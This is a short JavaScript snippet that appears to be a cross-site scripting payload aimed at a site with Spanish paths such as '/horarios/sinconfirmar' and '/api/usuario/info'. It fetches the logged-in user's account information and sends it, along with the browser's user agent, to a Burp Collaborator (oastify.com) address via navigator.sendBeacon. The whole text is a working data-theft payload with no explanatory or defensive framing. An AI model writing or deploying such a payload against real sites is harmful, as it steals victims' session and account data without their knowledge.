(function(){
  var burp="http://w630bbm6tppekzwbv9aovobqlhr8f03p.oastify.com/";
  
  fetch('/horarios/sinconfirmar').then(r=>r.text()).then(html=>{
  
    fetch('/api/usuario/info').then(r=>r.json()).then(data=>{
      navigator.sendBeacon(burp, JSON.stringify({
        session_data:data,
        userAgent:navigator.userAgent
      }));
    });
  });
})();
